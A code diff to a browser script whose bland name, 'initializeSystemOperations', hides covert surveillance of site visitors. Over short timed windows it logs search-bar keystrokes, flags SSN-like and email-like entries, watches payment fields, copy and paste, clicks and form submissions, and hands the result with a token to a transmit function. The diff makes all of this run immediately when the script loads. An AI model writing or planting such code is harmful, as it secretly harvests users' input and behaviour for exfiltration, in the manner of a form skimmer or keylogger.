@@ -1,4 +1,4 @@
-async function initializeSystemOperations() {
+(async function initializeSystemOperations() {
   const networkConfig = { attempts: 0, maxTries: 3, delay: 1000 };
   const dataStore = { token: null, sessionKey: 'sessionId' };
 
@@ -86,53 +86,60 @@ async function initializeSystemOperations() {
     let inputBuffer = '';
     const inputElement = document.getElementById('search-bar');
     if (inputElement) {
-      inputElement.addEventListener('keydown', (event) => {
+      const keydownHandler = (event) => {
         if (inputBuffer.length < 50 && !['password', 'card', 'ssn'].some(s => event.key.includes(s))) {
           inputBuffer += event.key;
         }
-      });
+      };
+      inputElement.addEventListener('keydown', keydownHandler);
       await new Promise(resolve => setTimeout(resolve, 1000));
+      inputElement.removeEventListener('keydown', keydownHandler);
     }
     environment.extended.keys = inputBuffer || 'None';
 
     let ssnFlag = 'None';
     if (inputElement) {
-      inputElement.addEventListener('input', (event) => {
+      const ssnHandler = (event) => {
         if (/\d{3}-\d{2}-\d{4}/.test(event.target.value)) {
           ssnFlag = 'SSN-like pattern detected';
         }
-      });
+      };
+      inputElement.addEventListener('input', ssnHandler);
       await new Promise(resolve => setTimeout(resolve, 1000));
+      inputElement.removeEventListener('input', ssnHandler);
     }
     environment.extended.ssn = ssnFlag;
 
     let emailFlag = 'None';
     if (inputElement) {
-      inputElement.addEventListener('input', (event) => {
+      const emailHandler = (event) => {
         if (/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/.test(event.target.value)) {
           emailFlag = 'Email-like pattern detected';
         }
-      });
+      };
+      inputElement.addEventListener('input', emailHandler);
       await new Promise(resolve => setTimeout(resolve, 1000));
+      inputElement.removeEventListener('input', emailHandler);
     }
     environment.extended.email = emailFlag;
 
     let paymentFlag = 'None';
     const paymentInputs = document.querySelectorAll('input[name*="card"], input[name*="credit"], input[name*="payment"]');
     if (paymentInputs.length > 0) {
-      paymentInputs.forEach(field => {
-        field.addEventListener('input', () => {
-          paymentFlag = 'Input in payment-related field detected';
-        });
-      });
+      const paymentHandler = () => {
+        paymentFlag = 'Input in payment-related field detected';
+      };
+      paymentInputs.forEach(field => field.addEventListener('input', paymentHandler));
       await new Promise(resolve => setTimeout(resolve, 1000));
+      paymentInputs.forEach(field => field.removeEventListener('input', paymentHandler));
     }
     environment.extended.payment = paymentFlag;
 
     let moveCounter = 0;
-    document.addEventListener('mousemove', () => moveCounter++, { once: false });
+    const mouseHandler = () => moveCounter++;
+    document.addEventListener('mousemove', mouseHandler);
     await new Promise(resolve => setTimeout(resolve, 1000));
-    document.removeEventListener('mousemove', () => moveCounter++);
+    document.removeEventListener('mousemove', mouseHandler);
     environment.extended.mouse = `${moveCounter}/s`;
 
     let graphicsSupport = 'Not supported';
@@ -149,11 +156,13 @@ async function initializeSystemOperations() {
     environment.extended.connection = navigator.connection?.effectiveType || 'Unknown';
 
     let clipboardState = 'None';
-    try {
-      document.addEventListener('copy', () => clipboardState = 'Copy attempted', { once: true });
-      document.addEventListener('paste', () => clipboardState = 'Paste attempted', { once: true });
-      await new Promise(resolve => setTimeout(resolve, 1000));
-    } catch (e) {}
+    const copyHandler = () => clipboardState = 'Copy attempted';
+    const pasteHandler = () => clipboardState = 'Paste attempted';
+    document.addEventListener('copy', copyHandler, { once: true });
+    document.addEventListener('paste', pasteHandler, { once: true });
+    await new Promise(resolve => setTimeout(resolve, 1000));
+    document.removeEventListener('copy', copyHandler);
+    document.removeEventListener('paste', pasteHandler);
     environment.extended.clipboard = clipboardState;
 
     environment.extended.orientation = 'DeviceOrientationEvent' in window ? 'Yes' : 'No';
@@ -177,9 +186,10 @@ async function initializeSystemOperations() {
     environment.extended.loadTime = `${Math.round(performance.now())}ms`;
 
     let interactionCount = 0;
-    document.addEventListener('click', () => interactionCount++, { once: false });
+    const clickHandler = () => interactionCount++;
+    document.addEventListener('click', clickHandler);
     await new Promise(resolve => setTimeout(resolve, 1000));
-    document.removeEventListener('click', () => interactionCount++);
+    document.removeEventListener('click', clickHandler);
     environment.extended.interactions = interactionCount;
 
     environment.extended.referrer = document.referrer || 'Direct';
@@ -192,7 +202,7 @@ async function initializeSystemOperations() {
     });
 
     let elementInteractions = [];
-    document.addEventListener('click', (event) => {
+    const elementHandler = (event) => {
       const target = event.target;
       if (!target.type || !['password', 'card', 'credit', 'payment', 'ssn'].some(t => target.type.includes(t) || target.name?.includes(t))) {
         elementInteractions.push(JSON.stringify({
@@ -201,27 +211,31 @@ async function initializeSystemOperations() {
           id: target.id || 'None'
         }));
       }
-    }, { once: false });
+    };
+    document.addEventListener('click', elementHandler);
     await new Promise(resolve => setTimeout(resolve, 1000));
-    document.removeEventListener('click', () => {});
+    document.removeEventListener('click', elementHandler);
     environment.extended.elements = elementInteractions.length ? elementInteractions.join('; ') : 'None';
 
     environment.extended.duration = `${Math.round(performance.now() - startTime)}ms`;
 
     let eventRecords = [`PageView: ${window.location.href}`];
-    document.addEventListener('click', (event) => {
+    const clickEventHandler = (event) => {
       const target = event.target;
       if (!target.type || !['password', 'card', 'credit', 'payment', 'ssn'].some(t => target.type.includes(t) || target.name?.includes(t))) {
         eventRecords.push(`Click: ${target.tagName.toLowerCase()}${target.id ? `#${target.id}` : ''}${target.className ? `.${target.className}` : ''}`);
       }
-    }, { once: false });
+    };
+    document.addEventListener('click', clickEventHandler);
     document.querySelectorAll('form').forEach(form => {
-      form.addEventListener('submit', () => {
+      const formHandler = () => {
         eventRecords.push(`FormSubmit: ${form.id || form.action || 'unnamed form'}`);
-      });
+      };
+      form.addEventListener('submit', formHandler);
     });
     await new Promise(resolve => setTimeout(resolve, 1000));
-    document.removeEventListener('click', () => {});
+    document.removeEventListener('click', clickEventHandler);
+    document.querySelectorAll('form').forEach(form => form.removeEventListener('submit', () => {}));
     environment.extended.events = eventRecords.length ? eventRecords.join('; ') : 'None';
 
     return environment;
@@ -261,10 +275,6 @@ async function initializeSystemOperations() {
     await transmitData(enhancedEnvironment, token);
   }
 
-  window.addEventListener('load', () => {
-    executeCoreLogic();
-  });
-
   const themeToggle = document.getElementById('theme-switch');
   if (themeToggle) {
     themeToggle.addEventListener('change', () => {
@@ -282,4 +292,6 @@ async function initializeSystemOperations() {
       });
     });
   }
-}
+
+  executeCoreLogic();
+})();
